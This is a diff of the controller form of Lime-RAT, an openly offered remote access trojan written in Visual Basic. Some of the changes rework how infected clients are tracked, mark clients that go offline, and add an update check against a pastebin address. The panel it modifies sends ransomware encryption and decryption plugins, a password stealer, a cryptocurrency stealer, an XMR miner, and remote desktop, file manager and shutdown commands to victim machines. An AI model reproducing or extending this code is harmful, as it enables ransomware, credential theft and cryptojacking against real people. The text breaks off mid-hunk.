@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Sept/14/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/17/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -37,7 +37,8 @@ Imports Mono.Cecil.Cil
 
 Public Class Main
 
-    Public WithEvents S As S_Socket
+    Public WithEvents S As S_TcpListener
+    Public Event Connected(ByVal sock As Integer)
     Public SPL = S_Settings.SPL
 
 
@@ -45,10 +46,10 @@ Public Class Main
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
-        Try : Timer2.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
+        Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
         Try
-            S = New S_Socket(S_Settings.PORT)
+            S = New S_TcpListener(S_Settings.PORT)
         Catch ex As Exception
             MsgBox(ex.Message)
             End
@@ -108,6 +109,17 @@ Public Class Main
             Try : Client.Close() : Catch : End Try
         End Try
 
+        Try
+            Using WC As New Net.WebClient()
+                Dim reply As String = WC.DownloadString("https://pastebin.com/raw/9kHA6nwH")
+                If reply <> S_Settings.StubVer Then
+                    Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
+                    WC.Dispose()
+                End If
+            End Using
+        Catch ex As Exception
+        End Try
+
     End Sub
 
 
@@ -119,14 +131,26 @@ Public Class Main
         SyncLock L1.Items
             Try
                 For i As Integer = 0 To L1.Items.Count - 1
-                    If L1.Items(i).ToolTipText = u Then
-                        L1.Items(i).Remove()
+                    If L1.Items(i).Tag = u Then
+                        L1.Items(i).ForeColor = Color.Red
+                        L1.Items(i).SubItems(PING.Index).Text = "Offline"
+                        L1.Items(i).Tag = Nothing
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                         Messages("{" + S.IP(u) + "}", "Disconnected")
+                        Exit For
                     End If
                 Next
             Catch ex As Exception
             End Try
         End SyncLock
+    End Sub
+
+    Private Sub Dicconnction_Tick(sender As Object, e As EventArgs) Handles Dicconnction.Tick
+        For Each x As ListViewItem In L1.Items
+            If x.SubItems(PING.Index).Text = "Offline" Then
+                x.Remove()
+            End If
+        Next
     End Sub
 
     Public List_PWD As New List(Of String)
@@ -139,9 +163,10 @@ Public Class Main
     Public _MINER_SETTINGS As String = ""
     Public CHK_MINER As Boolean = False
     Public CHK_PERS As Boolean = False
-
-    Private Sub S_Connected(ByVal u As Integer) Handles S.Connected
+    Private Sub S_Connected(ByVal u As Integer) Handles Me.Connected
         Try
+
+            Messages("{" + S.IP(u) + "}", "Connected")
 
             If CHK_DE AndAlso IO.File.Exists(PathEXE) AndAlso Not List_DE.Contains(S.IP(u)) Then
                 Dim MS As New IO.MemoryStream
@@ -178,6 +203,8 @@ Public Class Main
         End Try
     End Sub
 
+
+
 #End Region
 
 
@@ -192,30 +219,68 @@ Public Class Main
 
 #Region "Add to L1"
 
-                Case "info" ' Client Sent me PC name
+                Case "info"
                     If Me.InvokeRequired Then
                         Me.Invoke(New _Data(AddressOf Data), u, B)
                         Exit Sub
                     End If
                     SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items(i).SubItems(ID.Index).Text = A(1) AndAlso L1.Items(i).SubItems(USERN.Index).Text = A(2) Then
+                                L1.Items(i).Tag = u
+                                L1.Items(i).SubItems(IP.Index).Text = S.IP(u)
+                                L1.Items(i).SubItems(ID.Index).Text = A(1)
+                                L1.Items(i).SubItems(USERN.Index).Text = A(2)
+                                L1.Items(i).SubItems(VER.Index).Text = A(3)
+                                L1.Items(i).SubItems(OS.Index).Text = A(4)
+                                L1.Items(i).SubItems(INSDATE.Index).Text = A(5)
+                                L1.Items(i).SubItems(AV.Index).Text = A(6)
+                                L1.Items(i).SubItems(RANS.Index).Text = A(7)
+                                L1.Items(i).SubItems(XMR.Index).Text = A(8)
+                                L1.Items(i).SubItems(SP.Index).Text = A(9)
+                                L1.Items(i).SubItems(PING.Index).Text = "Online"
+                                L1.Items(i).ForeColor = Nothing
+                                L1.Items(i).ToolTipText = String.Format("Privileges {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13))
+                                Messages("{" + S.IP(u) + "}", "Reconnected")
+
+                                Try
+                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
+                                        L1.Items(i).ForeColor = ColorTranslator.FromHtml(GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color"))
+                                    End If
+
+                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
+                                        L1.Items(i).SubItems(NOTE_.Index).Text = GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note")
+                                    End If
+                                Catch ex As Exception
+                                End Try
+                                Exit Select
+                            End If
+                        Next
+
+                        ''''
+
                         Dim L = L1.Items.Add(_Gio.LookupCountryName(S.IP(u)), _Gio.LookupCountryCode(S.IP(u)) & ".png")
-                        L.ToolTipText = u
+                        L.Tag = u
+                        Try : L.ToolTipText = String.Format("Privileges {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13)) : Catch : End Try
                         L.SubItems.Add(S.IP(u))
+
                         For i As Integer = 1 To A.Length - 1
+                            If i = 12 Then Exit For
                             L.SubItems.Add(A(i))
                         Next
 
-                        If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
-                            L.ForeColor = ColorTranslator.FromHtml(GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color"))
-                        End If
+                        Try
+                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
+                                L.ForeColor = ColorTranslator.FromHtml(GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color"))
+                            End If
 
-                        If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
-                            L.SubItems(NOTE_.Index).Text = GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note")
-                        End If
+                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
+                                L.SubItems(NOTE_.Index).Text = GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note")
+                            End If
+                        Catch ex As Exception
+                        End Try
 
                         L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
-
-                        Messages("{" + S.IP(u) + "}", "Connected")
 
                         If MetroToggle1.Checked = True Then
                             NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
@@ -224,6 +289,7 @@ Public Class Main
                             NotifyIcon1.ShowBalloonTip(600)
                         End If
                     End SyncLock
+                    RaiseEvent Connected(u)
                     Exit Select
 
 #End Region
@@ -240,7 +306,7 @@ Public Class Main
                     End If
                     SyncLock L1.Items
                         For i As Integer = 0 To L1.Items.Count - 1
-                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                 L1.Items.Item(i).SubItems(PING.Index).Text = A(1).ToString
                                 Exit For
                             End If
@@ -257,7 +323,7 @@ Public Class Main
                     End If
                     SyncLock L1.Items
                         For i As Integer = 0 To L1.Items.Count - 1
-                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                 L1.Items.Item(i).SubItems(RANS.Index).Text = A(1).ToString
                                 Exit For
                             End If
@@ -273,7 +339,7 @@ Public Class Main
                     End If
                     SyncLock L1.Items
                         For i As Integer = 0 To L1.Items.Count - 1
-                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                 If A(1).ToString.Contains("Spreaded!") Then
                                     L1.Items.Item(i).BackColor = Color.DarkGreen
                                     L1.Items.Item(i).SubItems(SP.Index).Text = "Just Spreaded!"
@@ -294,7 +360,7 @@ Public Class Main
                     End If
                     SyncLock L1.Items
                         For i As Integer = 0 To L1.Items.Count - 1
-                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
                                 L1.Items.Item(i).SubItems(XMR.Index).Text = A(1).ToString
                                 Exit For
                             End If
@@ -311,7 +377,7 @@ Public Class Main
 
                     SyncLock L1.Items
                         For i As Integer = 0 To L1.Items.Count - 1
-                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(1).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(2).ToString Then
                                 L1.Items.Item(i).BackColor = Nothing
                                 Exit For
                             End If
@@ -1022,7 +1088,7 @@ Public Class Main
 
             e.DrawBackground()
 
-            If L2.Items(e.Index).ToString.Contains("Connected") Then
+            If L2.Items(e.Index).ToString.Contains("Connected") OrElse L2.Items(e.Index).ToString.Contains("Reconnected") Then
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, L, New PointF(e.Bounds.X, e.Bounds.Y))
 
             ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
@@ -1059,15 +1125,15 @@ Public Class Main
     Private Sub CAPstart_Click(sender As Object, e As EventArgs) Handles CAPstart.Click
         If CAPstart.Text = "START" Then
 
-            Timer4.Interval = CAPsec.Value * 1000
-            Timer4.Enabled = True
-            Timer4.Start()
+            CAP.Interval = CAPsec.Value * 1000
+            CAP.Enabled = True
+            CAP.Start()
             CAPstart.Text = "STOP"
 
         Else
 
             Try
-                Timer4.Dispose()
+                CAP.Dispose()
                 CAPstart.Text = "START"
                 L3.Items.Clear()
             Catch ex As Exception
@@ -1078,9 +1144,11 @@ Public Class Main
     End Sub
 
 
-    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
+    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles CAP.Tick
         For Each x As ListViewItem In L1.Items
-            S.Send(x.ToolTipText, "!CAP")
+            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                S.Send(x.Tag, "!CAP")
+            End If
         Next
     End Sub
 
@@ -1204,7 +1272,7 @@ Public Class Main
         End Try
     End Function
 
-    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles LabelUpdate.Tick
         Try
             MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
         Catch ex As Exception
@@ -1294,8 +1362,8 @@ Public Class Main
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
-                If _RDP Is Nothing Then
-                    S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
+                If _RDP Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
                     x.BackColor = Color.DarkSlateGray
                 End If
             Next
@@ -1316,17 +1384,19 @@ Public Class Main
                 RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
                 RANS_TEXT = R.RichTextBox1.Text
                 For Each x As ListViewItem In L1.SelectedItems
-                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
-                        result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                        If result = DialogResult.No Then
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
+                            result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                            If result = DialogResult.No Then
 
-                        ElseIf result = DialogResult.Yes Then
-                            S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
+                            ElseIf result = DialogResult.Yes Then
+                                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
+                                x.BackColor = Color.DarkSlateGray
+                            End If
+                        Else
+                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                             x.BackColor = Color.DarkSlateGray
                         End If
-                    Else
-                        S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
-                        x.BackColor = Color.DarkSlateGray
                     End If
                 Next
             End If
@@ -1339,19 +1409,21 @@ Public Class Main
     Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
-                    Dim result As DialogResult
-                    result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
+                        Dim result As DialogResult
+                        result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
 
-                    If result = DialogResult.No Then
+                        If result = DialogResult.No Then
 
-                    ElseIf result = DialogResult.Yes Then
-                        S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
+                        ElseIf result = DialogResult.Yes Then
+                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
+                            x.BackColor = Color.DarkSlateGray
+                        End If
+                    Else
+                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                         x.BackColor = Color.DarkSlateGray
                     End If
-                Else
-                    S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
-                    x.BackColor = Color.DarkSlateGray
                 End If
             Next
         Catch ex As Exception
@@ -1364,8 +1436,8 @@ Public Class Main
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
-                If FM Is Nothing Then
-                    S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
+                If FM Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
                     x.BackColor = Color.DarkSlateGray
                 End If
             Next
@@ -1379,8 +1451,8 @@ Public Class Main
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
-                If n Is Nothing Then
-                    S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
+                If n Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
                     x.BackColor = Color.DarkSlateGray
                 End If
             Next
@@ -1393,8 +1465,10 @@ Public Class Main
     Private Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1405,8 +1479,10 @@ Public Class Main
     Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1418,9 +1494,11 @@ Public Class Main
     Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
-                x.BackColor = Color.DarkSlateGray
-                PW_F = True
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                    PW_F = True
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1433,8 +1511,10 @@ Public Class Main
             Messages("Crypto currency Stealer", "Client must be .NET 4.0")
 
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll")))
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1459,11 +1539,13 @@ Public Class Main
                 MS.Write(CMD, 0, CMD.Length)
 
                 For Each x As ListViewItem In L1.SelectedItems
-                    If miner.OK = True AndAlso miner.K = False Then
-                        S.SendData(x.ToolTipText, MS.ToArray)
-                    ElseIf miner.K = True Then
-                        S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
-                        x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        If miner.OK = True AndAlso miner.K = False Then
+                            S.SendData(x.Tag, MS.ToArray)
+                        ElseIf miner.K = True Then
+                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
+                            x.BackColor = Color.DarkSlateGray
+                        End If
                     End If
                 Next
                 MS.Dispose()
@@ -1482,8 +1564,10 @@ Public Class Main
         Try
             Messages("Enable Remote Desktop", "Client must be running as Admin and using router that support UPNP")
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " ")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " ")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1497,8 +1581,10 @@ Public Class Main
     Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1509,8 +1595,10 @@ Public Class Main
     Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1521,8 +1609,10 @@ Public Class Main
     Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1549,8 +1639,10 @@ Public Class Main
                 Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
                 MS.Write(CMD, 0, CMD.Length)
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.SendData(x.ToolTipText, MS.ToArray)
-                    x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.SendData(x.Tag, MS.ToArray)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
                 Next
                 MS.Dispose()
             End If
@@ -1569,8 +1661,10 @@ Public Class Main
                 Exit Sub
             Else
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE)
-                    x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
                 Next
             End If
         Catch ex As Exception
@@ -1582,8 +1676,10 @@ Public Class Main
     Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1594,8 +1690,10 @@ Public Class Main
     Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1607,15 +1705,17 @@ Public Class Main
         Try
             Dim result As DialogResult
             For Each x As ListViewItem In L1.SelectedItems
-                If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
-                    result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                    If result = DialogResult.Yes Then
-                        S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
+                        result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                        If result = DialogResult.Yes Then
